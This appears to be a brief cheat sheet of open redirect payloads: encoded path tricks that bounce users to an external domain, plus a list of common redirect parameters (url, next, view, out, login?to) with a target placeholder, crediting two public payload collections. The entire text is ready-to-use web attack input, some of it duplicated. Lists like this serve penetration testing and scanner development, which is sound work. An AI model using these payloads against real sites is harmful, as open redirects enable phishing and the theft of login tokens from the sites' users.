## Open Redirect

```
/%09/google.com
```

```
/%5cgoogle.com
```

```
//www.google.com/%2f%2e%2e
```

```
//www.google.com/%2e%2e
```

```
//google.com/
```

```
//google.com/%2f..
```

```
//\google.com
```

```
/\victim.com:80%40google.com
```

## Possible open redirect parameters

```
?url=http://{target}
```

```
?url=https://{target}
```

```
?next=http://{target}
```

```
?next=https://{target}
```

```
?url=https://{target}
```

```
?url=http://{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?next=//{target}
```

```
?next=$2f%2f{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?url=//{target}
```

```
/redirect/{target}
```

```
/cgi-bin/redirect.cgi?{target}
```

```
/out/{target}
```

```
/out?{target}
```

```
/out?/{target}
```

```
/out?//{target}
```

```
/out?/\{target}
```

```
/out?///{target}
```

```
?view={target}
```

```
?view=/{target}
```

```
?view=//{target}
```

```
?view=/\{target}
```

```
?view=///{target}
```

```
/login?to={target}
```

```
/login?to=/{target}
```

```
/login?to=//{target}
```

```
/login?to=/\{target}
```

```
/login?to=///{target}
```



**Open Redirect Payloads** by @cujanovic

https://github.com/cujanovic/Open-Redirect-Payloads


**Open Redirect Paramters** by @fuzzdb-project

https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt
